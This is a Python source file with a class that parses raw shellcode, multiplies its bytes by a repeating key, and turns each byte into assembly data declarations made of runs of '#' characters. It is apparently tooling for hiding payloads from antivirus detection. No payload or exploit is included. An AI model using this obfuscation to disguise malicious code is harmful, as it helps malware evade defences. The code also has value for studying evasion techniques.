

from typing import Union


class ShellTemplate:
    def __init__(self, coder: object):
        self.coder = coder
    

    def ShadowScode(self, raw_scode: str, key: Union[str, list]) -> str:
        if isinstance(key, str):
            key = [ord(k) for k in key]
        scode = self.PutShellcode(raw_scode)
        raw = [int(b, 0) for b in scode.split(", ") if b != " " or b != ""]
        i = 0
        eSC = []
        for b in raw:
            if i == len(key):
                i = 0
            eSC.append(hex(b * key[i]))
            i += 1
        return ", ".join(eSC)

    def _build_scode(self, raw_scode: str, sc_prefix: str, separator: str) -> str:
        shellcode = ""
        for n in range(0, len(raw_scode) - 1, 2):
            shellcode += f"{sc_prefix}{raw_scode[n:n+2]}{separator}"
        shellcode = shellcode.rstrip(separator)
        return shellcode

    def PutShellcode(self, raw_shellcode: str, sc_prefix: str = "0x", separator: str = ", ") -> str:
        skip_char = ["", " ", "\n"]
        replace_char = ["'", '"', ";"]
        split_raw = raw_shellcode.split("\n")
        scode = ""
        for line in split_raw:
            if line in skip_char:
                continue
            for rc in replace_char:
                line = line.replace(rc, "")
            scode += line
        if scode.startswith("\\x"):
            scode = scode.replace("\\x", "")
        if scode.startswith("0x"):
            return scode
        scode = self._build_scode(scode, sc_prefix, separator)
        return scode
    
    def OneCharShadow(self, 
            shellcode: str,
            chars: str = "#",
            var_count_limit: int = 512,
            var_low: str = "wb",
            var_med: str = "cp",
            var_hi: str = "sg",
            var_master: str = "col",
            add_tabs: int = 1
            ):
        add_tabs = "\t" * add_tabs
        sc_list = [int(xb.strip(" "), 16) for xb in shellcode.split(",")]
        sc_len = len(sc_list)
        code = ""
        low_lvl = []
        # gen variables
        for i, sb in enumerate(sc_list):
            line = f'{add_tabs}{var_low}{i}: db "{sb * chars}", 0\n'
            code += line
            low_lvl.append(f"{var_low}{i}")
        code += "\n"
        i = 0
        med_lvl = []
        for v in range(0, len(low_lvl), var_count_limit):
            line = f"{add_tabs}{var_med}{i}: dq {', '.join(low_lvl[v:v+var_count_limit])}, 0\n"
            code += line
            med_lvl.append(f"{var_med}{i}")
            i += 1
        code += "\n"

        del low_lvl
        hi_lvl = []
        i = 0
        for v in range(0, len(med_lvl), var_count_limit):
            line = f"{add_tabs}{var_hi}{i}: dq {', '.join(med_lvl[v:v+var_count_limit])}, 0\n"
            code += line
            hi_lvl.append(f"{var_hi}{i}")
            i += 1
        code += "\n"

        line = f"{add_tabs}{var_master}: dq {', '.join(hi_lvl)}, 0\n\n"
        code += line

        return code
